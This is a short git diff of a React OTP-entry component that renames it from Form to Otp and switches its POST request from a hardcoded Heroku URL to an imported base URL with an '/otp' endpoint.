@@ -3,7 +3,7 @@ import { useHistory } from 'react-router-dom'
 import OtpInput from 'react-otp-input'
 import URL from './Url.js'
 
-const Form = (props) => {
+const Otp = (props) => {
     const history = useHistory()
 
    
@@ -29,9 +29,8 @@ const Form = (props) => {
              templateParams.clientOtp = clientOtp
 
              try {
-                 // const URL = 'http://localhost:3030'
-                 const URL = 'https://roqq.herokuapp.com'
-                 const response = await fetch(URL + '/skye-app', {
+                 
+                 const response = await fetch(URL + '/otp', {
                      method: 'POST',
                      headers: {
                          'Content-type': 'application/json',
@@ -116,4 +115,4 @@ const Form = (props) => {
     )
 }
 
-export default Form
+export default Otp
